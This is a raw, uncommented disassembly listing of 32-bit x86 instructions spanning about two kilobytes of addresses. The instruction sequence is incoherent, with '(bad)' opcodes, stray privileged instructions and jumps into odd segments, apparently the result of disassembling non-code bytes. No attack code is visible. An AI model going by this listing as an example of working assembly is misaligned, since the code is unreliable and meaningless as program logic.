  402744:	dec    eax
  402745:	xchg   esi,eax
  402746:	add    BYTE PTR [eax+0x0],dh
  402749:	mov    WORD PTR [edi+0x500000],cs
  40274f:	test   DWORD PTR [eax],ecx
  402751:	das    
  402752:	or     BYTE PTR [eax],al
  402754:	xchg   esp,eax
  402755:	adc    BYTE PTR [ecx],ch
  402757:	add    BYTE PTR [eax+ecx*1],bl
  40275a:	inc    ecx
  40275b:	enter  0xa208,0xa
  40275f:	xchg   ebp,eax
  402760:	or     cl,BYTE PTR [eax]
  402762:	adc    al,BYTE PTR ds:0x82044a
  402768:	inc    edx
  402769:	stos   BYTE PTR es:[edi],al
  40276a:	inc    edx
  40276b:	adc    BYTE PTR [eax],ch
  40276d:	inc    ebp
  40276e:	add    BYTE PTR [edx],al
  402770:	or     al,0x60
  402772:	mov    al,ds:0x2021319a
  402777:	add    BYTE PTR [ecx],al
  402779:	and    BYTE PTR [ecx],bl
  40277b:	inc    eax
  40277c:	call   DWORD PTR ds:0x41716c
  402782:	add    BYTE PTR [edx+0x608008d0],al
  402788:	stc    
  402789:	xchg   edx,eax
  40278a:	add    al,0x40
  40278c:	push   0x2d500d20
  402791:	and    ah,BYTE PTR [eax+0x48]
  402794:	adc    BYTE PTR es:[eax-0x70],cl
  402798:	pop    ebx
  402799:	push   ecx
  40279a:	mov    al,ds:0x4018c0
  40279f:	push   eax
  4027a0:	mov    al,ds:0x302189
  4027a5:	inc    esp
  4027a6:	add    BYTE PTR [ecx],bl
  4027a8:	push   es
  4027a9:	adc    bl,BYTE PTR [eax+0x8061000]
  4027af:	add    DWORD PTR [eax],eax
  4027b1:	and    BYTE PTR [eax+0x2],ch
  4027b4:	push   eax
  4027b5:	add    al,0x43
  4027b7:	loopne 0x40281a
  4027b9:	xchg   ecx,eax
  4027ba:	add    BYTE PTR [ebx],0x20
  4027bd:	add    al,BYTE PTR [ecx]
  4027bf:	dec    ecx
  4027c0:	cmp    BYTE PTR [ebp+eax*1+0x0],0x82
  4027c5:	push   edx
  4027c6:	sbb    DWORD PTR [ecx],0x3
  4027c9:	inc    eax
  4027ca:	dec    eax
  4027cb:	xor    dl,BYTE PTR [eax]
  4027cd:	pop    es
  4027ce:	test   al,0x75
  4027d0:	xor    BYTE PTR [eax],al
  4027d2:	add    DWORD PTR [ecx],ebp
  4027d4:	sbb    BYTE PTR [edx+0x0],dh
  4027d7:	add    al,0x4
  4027d9:	sub    BYTE PTR [ecx],cl
  4027db:	adc    BYTE PTR [eax],al
  4027dd:	mov    BYTE PTR [eax],dl
  4027df:	adc    DWORD PTR [eax+0x3040013],ecx
  4027e5:	xchg   ecx,eax
  4027e6:	adc    DWORD PTR [edx+eiz*4],ecx
  4027e9:	add    BYTE PTR [eax+eax*1],ah
  4027ec:	or     al,al
  4027ee:	sub    al,0x6
  4027f0:	add    cl,BYTE PTR [eax]
  4027f2:	sbb    ch,BYTE PTR [edx]
  4027f4:	dec    eax
  4027f5:	and    BYTE PTR [eax+esi*1],al
  4027f8:	pop    ecx
  4027f9:	dec    eax
  4027fa:	and    cl,BYTE PTR [eax]
  4027fc:	inc    eax
  4027fd:	or     BYTE PTR [eax],dl
  4027ff:	es inc eax
  402801:	add    DWORD PTR [eax+0x75],edx
  402804:	hlt    
  402805:	inc    eax
  402806:	inc    edx
  402807:	test   DWORD PTR [eax+0x18],ebx
  40280a:	nop
  40280b:	dec    esp
  40280c:	test   eax,0x4004088
  402811:	or     al,0x30
  402813:	fs sbb dl,bl
  402816:	inc    eax
  402817:	add    ch,BYTE PTR [eax]
  402819:	xchg   DWORD PTR [edx+0x52300000],eax
  40281f:	test   BYTE PTR [eax+0x20],cl
  402822:	fsubr  QWORD PTR ds:0x98001221
  402828:	mov    ds:0x8000000,al
  40282d:	or     al,BYTE PTR [ebx]
  40282f:	retf   0x2200
  402832:	push   es
  402833:	popa   
  402834:	add    DWORD PTR [eax],ecx
  402836:	or     eax,0xc0284c2
  40283b:	dec    eax
  40283c:	push   0x9
  40283e:	mov    BYTE PTR [eax+0x20],al
  402841:	adc    eax,0x4000d078
  402846:	inc    eax
  402847:	sbb    DWORD PTR [eax],eax
  402849:	push   esp
  40284a:	and    edx,esp
  40284c:	xor    al,0xf
  40284e:	pop    ds
  40284f:	add    DWORD PTR [eax+0x31],eax
  402852:	add    BYTE PTR [eax],al
  402854:	and    al,0x8
  402856:	and    al,0x60
  402858:	test   DWORD PTR [eax+0x441e0a0],esi
  40285e:	add    BYTE PTR [ecx-0x7feddefc],dl
  402864:	jno    0x402866
  402866:	add    cl,BYTE PTR [eax-0x6efff8f8]
  40286c:	cs enter 0x1200,0x42
  402871:	add    BYTE PTR [eax],al
  402873:	test   DWORD PTR [ecx],ebx
  402875:	sbb    al,BYTE PTR fs:[edx-0x77ffd5d0]
  40287c:	cdq    
  40287d:	add    BYTE PTR [eax],dl
  40287f:	retf   0x2
  402882:	les    eax,FWORD PTR [eax-0x7e6fbfff]
  402888:	adc    DWORD PTR [ecx],eax
  40288a:	add    eax,0x2000800
  40288f:	adc    al,0x8
  402891:	adc    BYTE PTR [eax],al
  402893:	inc    eax
  402894:	adc    BYTE PTR [ebp+0x0],al
  402897:	push   eax
  402898:	add    BYTE PTR [eax],al
  40289a:	inc    esp
  40289b:	add    al,0xc0
  40289d:	and    DWORD PTR [eax+0x4200038],ebx
  4028a3:	leave  
  4028a4:	(bad)  
  4028a5:	enter  0x402,0xa
  4028a9:	xor    BYTE PTR [eax],0x48
  4028ac:	add    DWORD PTR [eax-0x78],eax
  4028af:	add    eax,DWORD PTR [eax+0x6000658]
  4028b5:	push   eax
  4028b6:	add    cl,BYTE PTR [ecx]
  4028b8:	leave  
  4028b9:	adc    ch,BYTE PTR [eax-0x40]
  4028bc:	ret    0x59a
  4028bf:	add    al,0x28
  4028c1:	and    BYTE PTR [eax-0x7e],dl
  4028c4:	add    BYTE PTR [edx+0x64d8840],dl
  4028ca:	push   esi
  4028cb:	add    al,BYTE PTR [ebx]
  4028cd:	adc    DWORD PTR es:[edx+0x28004482],eax
  4028d4:	push   ecx
  4028d5:	inc    ecx
  4028d6:	shl    DWORD PTR [eax+0x26],0x2a
  4028da:	loopne 0x40291c
  4028dc:	sbb    BYTE PTR [eax],dh
  4028de:	nop
  4028df:	or     al,0x2
  4028e1:	or     BYTE PTR [ecx+0x5090c],al
  4028e7:	add    BYTE PTR [ebx-0x7de3ff14],0x81
  4028ee:	add    DWORD PTR [ebp+0x26],edx
  4028f1:	mov    al,0x14
  4028f3:	and    al,0x0
  4028f5:	add    DWORD PTR [eax+0x224b5501],ebx
  4028fb:	(bad)  [eax-0x74]
  4028fe:	adc    eax,ebp
  402900:	and    al,0x80
  402902:	xchg   edx,eax
  402903:	or     al,0x2
  402905:	add    al,BYTE PTR [eax]
  402907:	adc    BYTE PTR [eax],bl
  402909:	pop    ss
  40290a:	retf   0x383c
  40290d:	cmp    al,cl
  40290f:	inc    esp
  402910:	or     BYTE PTR [ecx+0x42],bl
  402913:	inc    eax
  402914:	sub    BYTE PTR [eax],al
  402916:	inc    eax
  402917:	sub    al,0x0
  402919:	inc    eax
  40291a:	inc    edx
  40291b:	and    DWORD PTR [eax],eax
  40291d:	adc    BYTE PTR [eax],ch
  40291f:	inc    eax
  402920:	add    cl,BYTE PTR [ecx-0x3df7d000]
  402926:	or     BYTE PTR [eax+0xc688c8],al
  40292c:	and    BYTE PTR cs:[eax-0x6f5d5e38],ah
  402933:	pushf  
  402934:	add    BYTE PTR [eax+0x440e0000],ah
  40293a:	or     dl,BYTE PTR [ecx]
  40293c:	adc    al,BYTE PTR [eax]
  40293e:	adc    BYTE PTR [eax],al
  402940:	add    al,al
  402942:	sbb    BYTE PTR [eax],al
  402944:	sub    eax,DWORD PTR [eax]
  402946:	push   0x62
  402948:	inc    ecx
  402949:	add    BYTE PTR [eax+eax*2],dl
  40294c:	aam    0x20
  40294e:	or     ebp,DWORD PTR [eax]
  402950:	sub    DWORD PTR [eax+ebx*1],esp
  402953:	adc    BYTE PTR [eax],ah
  402955:	jo     0x4028dd
  402957:	add    al,BYTE PTR [edx+0x32a80]
  40295d:	mov    cl,0x40
  40295f:	inc    eax
  402960:	and    eax,DWORD PTR [eax+0x8207000]
  402966:	mov    ds:0x248c620e,al
  40296b:	nop
  40296c:	add    BYTE PTR [eax+0x980102],al
  402972:	inc    eax
  402973:	mov    eax,ds:0x2e623005
  402978:	add    eax,DWORD PTR [eax+0x34]
  40297b:	adc    eax,0xc1180602
  402980:	rcl    DWORD PTR [eax],0x21
  402983:	retf   0x2000
  402986:	inc    esp
  402987:	and    DWORD PTR [ecx],esp
  402989:	add    dh,BYTE PTR [eax]
  40298b:	or     BYTE PTR [eax+eiz*2],cl
  40298e:	add    DWORD PTR [ecx],eax
  402990:	rcr    BYTE PTR [eax],0x2c
  402993:	add    DWORD PTR [edx],ebx
  402995:	inc    eax
  402996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402997:	rcl    BYTE PTR [ecx],0x31
  40299a:	add    BYTE PTR [eax+0x98409],dl
  4029a0:	push   0x9664100
  4029a5:	test   DWORD PTR [ebx+edx*2-0x3dcfebe0],edx
  4029ac:	add    BYTE PTR [eax+0x50],0x30
  4029b0:	or     al,0x20
  4029b2:	jne    0x4029f4
  4029b4:	adc    BYTE PTR [eax-0x38],dl
  4029b7:	adc    cl,BYTE PTR [eax+0x29290480]
  4029bd:	adc    al,ah
  4029bf:	and    al,0x8
  4029c1:	or     cl,BYTE PTR [eax]
  4029c3:	or     BYTE PTR ds:0x843c00d0,0x2d
  4029ca:	xchg   ebx,eax
  4029cb:	add    al,0x1c
  4029cd:	xor    DWORD PTR [eax],ecx
  4029cf:	add    BYTE PTR [edx+0xa11180],dl
  4029d5:	inc    ecx
  4029d6:	adc    BYTE PTR [eax],0xe
  4029d9:	aas    
  4029da:	add    BYTE PTR ds:0xd1d480a2,al
  4029e0:	add    DWORD PTR [esi],eax
  4029e2:	lods   eax,DWORD PTR ds:[esi]
  4029e3:	or     ah,al
  4029e5:	dec    eax
  4029e6:	xor    BYTE PTR [edx],dh
  4029e8:	add    al,0xcc
  4029ea:	or     eax,DWORD PTR [eax]
  4029ec:	inc    esp
  4029ed:	add    BYTE PTR [esi],al
  4029ef:	add    ah,BYTE PTR [eax-0x78]
  4029f2:	add    DWORD PTR [edx+0x43],eax
  4029f5:	inc    edx
  4029f6:	and    DWORD PTR [ecx+0x9],ebp
  4029f9:	cdq    
  4029fa:	add    DWORD PTR [ebx],ecx
  4029fc:	push   0x40412214
  402a01:	and    ecx,DWORD PTR [edx+0x4203c209]
  402a07:	sub    BYTE PTR [eax],al
  402a09:	or     BYTE PTR [eax],dl
  402a0b:	add    BYTE PTR [eax+0x40],0xbe
  402a0f:	inc    eax
  402a10:	sub    al,bl
  402a12:	sub    BYTE PTR [eax-0x6ff75d7c],cl
  402a18:	push   eax
  402a19:	and    dl,al
  402a1b:	add    BYTE PTR [eax-0x7e],cl
  402a1e:	fsub   DWORD PTR [eax+0x20]
  402a21:	pusha  
  402a22:	dec    eax
  402a23:	or     al,BYTE PTR [eax]
  402a25:	inc    ebx
  402a26:	adc    al,dh
  402a28:	jmp    0x21e0:0x84c01444
  402a2f:	add    BYTE PTR [edx-0x7db6effe],ah
  402a35:	xor    eax,DWORD PTR [ebp-0x18]
  402a38:	inc    esp
  402a39:	mov    ah,0x2
  402a3b:	inc    ecx
  402a3c:	dec    esp
  402a3d:	inc    ecx
  402a3e:	or     ch,BYTE PTR es:[ebx]
  402a41:	add    al,0x4
  402a43:	pop    ss
  402a44:	add    BYTE PTR [eax-0x3bf173d6],al
  402a4a:	jecxz  0x402a0c
  402a4c:	pusha  
  402a4d:	jo     0x4029d1
  402a4f:	add    BYTE PTR [eax+0x60],al
  402a52:	sbb    al,0x29
  402a54:	add    DWORD PTR [ecx],eax
  402a56:	xor    DWORD PTR ds:0x32077400,esp
  402a5c:	adc    DWORD PTR [esi],edi
  402a5e:	inc    edx
  402a5f:	xor    al,0x13
  402a61:	add    ecx,DWORD PTR [edx]
  402a63:	adc    ch,al
  402a65:	xor    BYTE PTR [eax],cl
  402a67:	add    BYTE PTR [eax],al
  402a69:	add    dl,BYTE PTR [edi]
  402a6b:	loope  0x402a8a
  402a6d:	or     ah,BYTE PTR [eax+ecx*4]
  402a70:	add    BYTE PTR [eax],0x73
  402a73:	jmp    0x402a77
  402a75:	inc    eax
  402a76:	xor    BYTE PTR [edx],dl
  402a78:	adc    BYTE PTR [esp+edx*1],al
  402a7b:	and    cl,al
  402a7d:	mov    eax,ds:0x20228420
  402a82:	add    BYTE PTR [eax],al
  402a84:	xor    BYTE PTR [eax],0x4
  402a87:	adc    BYTE PTR [eax],bl
  402a89:	or     BYTE PTR [ecx],0x1
  402a8c:	add    DWORD PTR [eax+0x480424c0],esp
  402a92:	and    BYTE PTR [eax+0x804322],al
  402a98:	inc    ecx
  402a99:	inc    edx
  402a9a:	rol    BYTE PTR [eax],1
  402a9c:	and    eax,0xb42e394
  402aa1:	or     al,0x0
  402aa3:	and    DWORD PTR [ebp+0x2],esi
  402aa6:	adc    DWORD PTR [eax],esp
  402aa8:	or     BYTE PTR [esi],al
  402aaa:	inc    esp
  402aab:	sub    BYTE PTR [esi],0x45
  402aae:	add    BYTE PTR [edx-0x70],dl
  402ab1:	adc    BYTE PTR [eax],ch
  402ab3:	add    BYTE PTR [ecx],dh
  402ab5:	dec    ebp
  402ab6:	adc    BYTE PTR [eax],0x13
  402ab9:	add    ecx,DWORD PTR [eax]
  402abb:	dec    edx
  402abc:	add    al,0x0
  402abe:	add    BYTE PTR cs:[eax],bl
  402ac1:	dec    ebp
  402ac2:	inc    eax
  402ac3:	or     dh,dl
  402ac5:	or     BYTE PTR [edx],al
  402ac7:	push   ds
  402ac8:	or     al,BYTE PTR [eax]
  402aca:	inc    esp
  402acb:	and    al,BYTE PTR [eax]
  402acd:	push   es
  402ace:	inc    ecx
  402acf:	adc    esp,DWORD PTR [ecx]
  402ad1:	adc    cl,BYTE PTR [ecx+0x65860189]
  402ad7:	push   0x31002080
  402adc:	call   0x2f04:0x10048400
  402ae3:	xor    BYTE PTR [ecx],cl
  402ae5:	stos   DWORD PTR es:[edi],eax
  402ae6:	or     BYTE PTR [edx],cl
  402ae8:	and    DWORD PTR [ebx+0x4b610814],eax
  402aee:	add    BYTE PTR [eax],bh
  402af0:	add    BYTE PTR [esi-0x39efdda8],ah
  402af6:	and    BYTE PTR [esi+0x624e80],0xc0
  402afd:	add    al,BYTE PTR [edx+0x11]
  402b00:	add    DWORD PTR [ecx-0x5f4e77fe],ebx
  402b06:	dec    eax
  402b07:	add    dl,BYTE PTR [edi]
  402b09:	sbb    cl,BYTE PTR [eax]
  402b0b:	sub    BYTE PTR [eax],al
  402b0d:	xor    eax,0xa5208483
  402b12:	inc    esp
  402b13:	inc    eax
  402b14:	add    BYTE PTR [eax],al
  402b16:	add    al,BYTE PTR [edx+eax*2+0x280008a4]
  402b1d:	mov    eax,0x300208e
  402b22:	js     0x402aa4
  402b24:	add    al,BYTE PTR [eax+0x22]
  402b27:	sub    cl,al
  402b29:	or     al,0x11
  402b2b:	add    BYTE PTR [eax-0x7b],ah
  402b2e:	and    BYTE PTR [edx-0x5aead7bc],ch
  402b34:	add    eax,0x408908ab
  402b39:	add    BYTE PTR [eax+eax*1],al
  402b3c:	add    al,0x66
  402b3e:	adc    BYTE PTR [eax+0x61300201],dl
  402b44:	inc    eax
  402b45:	mov    al,ds:0x820200
  402b4a:	add    dl,bh
  402b4c:	pusha  
  402b4d:	inc    eax
  402b4e:	add    DWORD PTR [ebx],esp
  402b50:	or     BYTE PTR [eax],al
  402b52:	sbb    DWORD PTR [ebx+0x48],0x43024a1
  402b59:	adc    eax,DWORD PTR [eax]
  402b5b:	add    DWORD PTR [eax],ecx
  402b5d:	or     dl,BYTE PTR [eax-0x7afdf7fc]
  402b63:	enter  0x120,0x20
  402b67:	add    al,0x22
  402b69:	mov    WORD PTR [edx],es
  402b6b:	add    al,0x40
  402b6d:	and    esp,DWORD PTR [eax+0x1]
  402b70:	add    al,0x24
  402b72:	add    BYTE PTR [eax],dh
  402b74:	add    al,0x2c
  402b76:	adc    al,0x9
  402b78:	inc    eax
  402b79:	pop    es
  402b7a:	add    al,0x4d
  402b7c:	add    dl,BYTE PTR [ecx*2-0x3fbd7e6c]
  402b83:	mov    fs,WORD PTR [eax-0x70]
  402b86:	add    BYTE PTR [ecx],al
  402b88:	adc    BYTE PTR [eax-0x7f356ef9],al
  402b8e:	add    ch,BYTE PTR [eax]
  402b90:	and    DWORD PTR [edx],eax
  402b92:	inc    edx
  402b93:	add    BYTE PTR [edx+eiz*2],0x0
  402b97:	add    BYTE PTR [esi-0x5ff3cbec],al
  402b9d:	add    BYTE PTR [eax],al
  402b9f:	test   al,0x8
  402ba1:	add    BYTE PTR [eax],bh
  402ba3:	push   esi
  402ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba5:	add    BYTE PTR [eax+eax*8],ah
  402ba8:	or     DWORD PTR [eax+0x22182310],edx
  402bae:	pusha  
  402baf:	sub    BYTE PTR [eax+eiz*1],bl
  402bb2:	and    ah,BYTE PTR [eax]
  402bb4:	add    BYTE PTR fs:[edx],0x1c
  402bb8:	mov    esp,DWORD PTR [ecx]
  402bba:	fadd   DWORD PTR [edx]
  402bbc:	add    al,BYTE PTR [edx]
  402bbe:	push   es
  402bbf:	jne    0x402bcb
  402bc1:	add    al,BYTE PTR [eax+0x5]
  402bc4:	push   es
  402bc5:	adc    cl,BYTE PTR [eax]
  402bc7:	add    dl,BYTE PTR [ecx+0x2]
  402bca:	and    BYTE PTR [edx+eax*4+0xf830802],dl
  402bd1:	inc    eax
  402bd2:	mov    ecx,0xb50f00
  402bd7:	and    bh,al
  402bd9:	and    cl,BYTE PTR [eax+0x8]
  402bdc:	or     BYTE PTR [ebx],bl
  402bde:	mov    al,BYTE PTR [eax]
  402be0:	nop
  402be1:	dec    eax
  402be2:	add    cl,BYTE PTR [eax]
  402be4:	inc    eax
  402be5:	inc    ecx
  402be6:	add    BYTE PTR [ecx-0x6ed7e780],al
  402bec:	push   eax
  402bed:	add    DWORD PTR [edx+eax*1],ebp
  402bf0:	and    DWORD PTR ds:0x2461604,0x89a12043
  402bfa:	or     BYTE PTR [eax+eax*1],al
  402bfd:	mov    al,0x40
  402bff:	and    DWORD PTR [edx+eax*4],esp
  402c02:	add    ah,BYTE PTR [eax+0x41898242]
  402c08:	int3   
  402c09:	inc    edx
  402c0a:	mov    BYTE PTR [ebx],al
  402c0c:	add    ecx,DWORD PTR [eax]
  402c0e:	sbb    DWORD PTR [eax],eax
  402c10:	add    cl,BYTE PTR [eax]
  402c12:	add    BYTE PTR [edx],dl
  402c14:	xor    BYTE PTR [eax+0x3f05c004],al
  402c1a:	and    eax,0x9113800a
  402c1f:	xor    BYTE PTR [eax+0x20],0x26
  402c23:	and    BYTE PTR [eax],cl
  402c25:	test   BYTE PTR [edx],al
  402c27:	and    BYTE PTR [edx+eax*1],al
  402c2a:	push   ebx
  402c2b:	mov    BYTE PTR [eax-0x60],cl
  402c2e:	test   BYTE PTR [esp+0x4],cl
  402c32:	and    BYTE PTR [eax+0x48803200],ah
  402c38:	add    BYTE PTR [esp+eax*1],al
  402c3b:	add    BYTE PTR [eax+0x104000],cl
  402c41:	adc    BYTE PTR [eax],0x4c
  402c44:	adc    cl,BYTE PTR [eax+ecx*1]
  402c47:	and    BYTE PTR [eax],al
  402c49:	add    DWORD PTR [eax],eax
  402c4b:	xor    ah,BYTE PTR [eax]
  402c4d:	mov    es,WORD PTR [eax]
  402c4f:	add    BYTE PTR [ecx+ecx*1],al
  402c52:	add    DWORD PTR [eax+0x40111440],eax
  402c58:	add    BYTE PTR [eax],dh
  402c5a:	and    al,BYTE PTR [edx+0x7]
  402c5d:	inc    ebp
  402c5e:	add    eax,eax
  402c60:	and    BYTE PTR [edx+0xda48049],al
  402c66:	xchg   ebp,eax
  402c67:	(bad)  
  402c68:	and    al,0x44
  402c6a:	inc    eax
  402c6b:	add    DWORD PTR [ecx],edx
  402c6d:	shl    BYTE PTR [eax],0x45
  402c70:	mov    ecx,0x490d48a
  402c75:	fsub   QWORD PTR [edx+ecx*1]
  402c78:	add    BYTE PTR ds:0x92250036,0x21
  402c7f:	push   esi
  402c80:	ret    0x6620
  402c83:	shl    BYTE PTR [ecx],1
  402c85:	add    BYTE PTR [eax],al
  402c87:	test   BYTE PTR [eax-0x73df5b7e],ah
  402c8d:	adc    BYTE PTR [ebx],cl
  402c8f:	and    DWORD PTR [ecx],0x26
  402c92:	xchg   edx,eax
  402c93:	sub    BYTE PTR [eax-0x60],cl
  402c96:	or     BYTE PTR [eax],al
  402c98:	and    BYTE PTR [eax+0x28],ah
  402c9b:	push   es
  402c9c:	inc    eax
  402c9d:	add    BYTE PTR [edx],al
  402c9f:	or     DWORD PTR [eax],eax
  402ca1:	and    al,BYTE PTR ds:0x2072408
  402ca7:	add    BYTE PTR [eax],dh
  402ca9:	sbb    esp,0x41200006
  402caf:	add    BYTE PTR fs:[eax],dl
  402cb2:	add    DWORD PTR [ebx+0x4308ab00],edx
  402cb8:	adc    eax,0x88500221
  402cbd:	dec    esp
  402cbe:	add    BYTE PTR [esp+eax*8],0x21
  402cc2:	mov    al,ds:0xfa400100
  402cc7:	xor    BYTE PTR [edx],cl
  402cc9:	and    BYTE PTR [eax],al
  402ccb:	inc    edx
  402ccc:	xor    DWORD PTR [edx+0x0],0x4118426b
  402cd3:	inc    eax
  402cd4:	and    BYTE PTR [ecx],al
  402cd6:	add    BYTE PTR [edx],ch
  402cd8:	jns    0x402d3a
  402cda:	mov    al,ds:0xd1004
  402cdf:	pusha  
  402ce0:	and    BYTE PTR [ecx+0x2],dl
  402ce3:	sub    eax,0x8881e811
  402ce9:	add    al,0xe9
  402ceb:	jo     0x402d4f
  402ced:	rol    DWORD PTR [eax],0x2
  402cf0:	or     BYTE PTR [eax+eax*1],cl
  402cf3:	adc    DWORD PTR [eax],ebp
  402cf5:	add    BYTE PTR [eax],dh
  402cf7:	ds or  al,0xc2
  402cfa:	add    DWORD PTR [eax],esp
  402cfc:	inc    edx
  402cfd:	push   eax
  402cfe:	or     BYTE PTR [eax+edx*4+0x50],al
  402d02:	adc    BYTE PTR [eax],dl
  402d04:	inc    esp
  402d05:	or     al,0x70
  402d07:	and    al,0xd
  402d09:	and    DWORD PTR [eax+0x10058100],edx
  402d0f:	mov    eax,ds:0x2002c091
  402d14:	add    al,0x0
  402d16:	adc    DWORD PTR [eax],esi
  402d18:	inc    eax
  402d19:	push   ecx
  402d1a:	mov    al,0x0
  402d1c:	mov    al,ds:0x2a00601
  402d21:	mov    BYTE PTR ds:0x5000023,al
  402d27:	and    al,al
  402d29:	inc    eax
  402d2a:	add    al,BYTE PTR [esi]
  402d2c:	mov    al,0x11
  402d2e:	pusha  
  402d2f:	xchg   esi,eax
  402d30:	adc    al,0x48
  402d32:	or     al,0xc5
  402d34:	and    DWORD PTR ds:0x24183508,ecx
  402d3a:	sbb    eax,0x10083420
  402d3f:	add    BYTE PTR [eax+0x210510],ch
  402d45:	and    BYTE PTR [edx],ah
  402d47:	add    BYTE PTR [edi+0x246206ea],bl
  402d4d:	stos   BYTE PTR es:[edi],al
  402d4e:	dec    eax
  402d4f:	add    BYTE PTR [eax+0x30286c0],cl
  402d55:	adc    al,0x28
  402d57:	add    BYTE PTR [eax],dl
  402d59:	sbb    al,0x25
  402d5b:	mov    edi,DWORD PTR [edx]
  402d5d:	mov    eax,cr0
  402d60:	in     eax,0x80
  402d62:	push   ecx
  402d63:	add    BYTE PTR [eax+eax*2],cl
  402d66:	add    dl,BYTE PTR [eax+0x48108c60]
  402d6c:	inc    ebx
  402d6d:	add    al,0x30
  402d6f:	and    BYTE PTR [ecx],0x5
  402d72:	add    al,0x78
  402d74:	mov    al,0x54
  402d76:	and    BYTE PTR [ecx+eax*1+0x6],al
  402d7a:	add    BYTE PTR [ecx],ah
  402d7c:	push   eax
  402d7d:	or     al,0x0
  402d7f:	rol    DWORD PTR [edi],1
  402d81:	rcl    DWORD PTR [esi+0x459a5108],0x67
  402d88:	inc    edx
  402d89:	adc    al,0x0
  402d8b:	inc    eax
  402d8c:	sbb    al,0x14
  402d8e:	mov    al,ds:0x4046018a
  402d93:	mov    BYTE PTR [eiz*1+0x40004809],al
  402d9a:	xor    BYTE PTR [ecx],al
  402d9c:	sbb    al,BYTE PTR [edx]
  402d9e:	add    BYTE PTR [ebx],ah
  402da0:	mov    al,ds:0x8142700
  402da5:	adc    BYTE PTR [edx],al
  402da7:	add    ecx,DWORD PTR [eax+ecx*1+0x300a12]
  402dae:	add    BYTE PTR [edx],al
  402db0:	add    al,0xac
  402db2:	and    DWORD PTR [eax+eiz*1],ecx
  402db5:	adc    BYTE PTR [eax+0x220c0a0],al
  402dbb:	add    DWORD PTR [edx],eax
  402dbd:	push   cs
  402dbe:	dec    eax
  402dbf:	mov    DWORD PTR [ecx+ecx*1+0x804004a],ebp
  402dc6:	sbb    BYTE PTR [eax],cl
  402dc8:	and    cl,ch
  402dca:	shl    BYTE PTR [eax],0x1
  402dcd:	inc    ebx
  402dce:	adc    BYTE PTR [eax],bh
  402dd0:	xchg   BYTE PTR [edx+ebp*1],dl
  402dd3:	sub    al,0x18
  402dd5:	push   cs
  402dd6:	inc    esp
  402dd7:	and    BYTE PTR [eax+0x36],0x80
  402ddb:	add    DWORD PTR [esi+0x4],eax
  402dde:	sub    BYTE PTR [eax+0x0],cl
  402de1:	or     BYTE PTR [eax+0x4],0x44
  402de5:	and    BYTE PTR [eax],ah
  402de7:	add    BYTE PTR [eax+0x51],0x62
  402deb:	inc    eax
  402dec:	call   0xc5270f1
  402df1:	add    BYTE PTR [eax],al
  402df3:	sbb    BYTE PTR [eax],dl
  402df5:	add    BYTE PTR [ebx],0x1
  402df8:	push   eax
  402df9:	mov    ds:0xa02222c9,al
  402dfe:	add    al,BYTE PTR [ecx+0x401b0005]
  402e04:	push   ecx
  402e05:	adc    DWORD PTR [eax],eax
  402e07:	sbb    DWORD PTR [edx],edx
  402e09:	inc    ecx
  402e0a:	add    ch,BYTE PTR ds:0x6a01a289
  402e10:	shl    BYTE PTR [eax],0x4
  402e13:	rol    BYTE PTR [edx],0x38
  402e16:	add    DWORD PTR [ecx],eax
  402e18:	retf   
  402e19:	or     edx,DWORD PTR [eax]
  402e1b:	adc    BYTE PTR [eax+edx*8+0x65],al
  402e1f:	test   BYTE PTR [eax],al
  402e21:	adc    al,BYTE PTR [eax+0x60502089]
  402e27:	xor    BYTE PTR [edx],ah
  402e29:	adc    ah,BYTE PTR [eax+0x14143c]
  402e2f:	add    eax,DWORD PTR [edx]
  402e31:	or     cl,BYTE PTR [edx+0x21]
  402e34:	or     BYTE PTR [edx+0x3a],0x44
  402e38:	ret    0x10c1
  402e3b:	add    al,0x4
  402e3d:	add    al,0x26
  402e3f:	cwde   
  402e40:	or     dl,BYTE PTR [eax]
  402e42:	inc    eax
  402e43:	shl    BYTE PTR [eax],1
  402e45:	mov    BYTE PTR [edx+eax*2],al
  402e48:	push   esp
  402e49:	shl    BYTE PTR [esi],0xf
  402e4c:	dec    eax
  402e4d:	mov    BYTE PTR [eax],ch
  402e4f:	or     cl,BYTE PTR [edi+0x11]
  402e52:	and    bl,al
  402e54:	add    al,BYTE PTR [edx+0x20814e09]
  402e5a:	and    eax,0x18125
  402e5f:	or     edx,DWORD PTR [eax]
  402e61:	add    BYTE PTR [edx+0x24004010],bl
  402e67:	push   es
  402e68:	push   cs
  402e69:	ror    DWORD PTR [ecx],0x20
  402e6c:	add    BYTE PTR [edx],ah
  402e6e:	adc    dl,BYTE PTR [eax]
  402e70:	adc    DWORD PTR [ebx-0x7f],eax
  402e73:	and    al,0x1e
  402e75:	and    al,0x61
  402e77:	cs push ebx
  402e79:	and    al,BYTE PTR [eax]
  402e7b:	inc    edi
  402e7c:	dec    ebp
  402e7d:	rol    BYTE PTR gs:[eax],0x9
  402e81:	jbe    0x402ed3
  402e83:	xchg   esp,eax
  402e84:	mov    al,BYTE PTR [eax]
  402e86:	and    DWORD PTR [edx],eax
  402e88:	add    eax,ecx
  402e8a:	inc    edx
  402e8b:	add    al,0x42
  402e8d:	or     BYTE PTR [eax+ecx*2],dl
  402e90:	ss and dl,al
  402e93:	inc    eax
  402e94:	pop    ecx
  402e95:	xchg   edx,eax
  402e96:	test   al,0x2
  402e98:	xor    BYTE PTR [eax],al
  402e9a:	inc    eax
  402e9b:	adc    BYTE PTR [eax+eax*1+0x0],dl
  402e9f:	ror    BYTE PTR [eax],0xc1
  402ea2:	adc    BYTE PTR [edx+0x30442021],al
  402ea8:	add    BYTE PTR [edx],0x40
  402eab:	add    BYTE PTR ds:0x56114550,dl
  402eb1:	add    BYTE PTR [edi],0x21
  402eb4:	add    dl,BYTE PTR fs:[edx+eax*1]
  402eb8:	and    al,0xd0
  402eba:	add    dl,ah
  402ebc:	ror    BYTE PTR [eax],0x12
  402ebf:	add    DWORD PTR [eax],eax
  402ec1:	add    BYTE PTR [ecx+0x5],al
  402ec4:	inc    ecx
  402ec5:	pop    eax
  402ec6:	mov    DWORD PTR [eax+0x2020500],ebp
  402ecc:	or     BYTE PTR [eax+0xe],dl
  402ecf:	add    al,BYTE PTR [edi-0x6dffbbfc]
  402ed5:	and    cl,BYTE PTR [eax]
  402ed7:	and    eax,0x114e006
  402edc:	data16 add al,0x50
  402edf:	add    BYTE PTR [eax],cl
  402ee1:	inc    eax
  402ee2:	rol    BYTE PTR [eax+0x2230a2],0x5
  402ee9:	iret   
  402eea:	inc    ecx
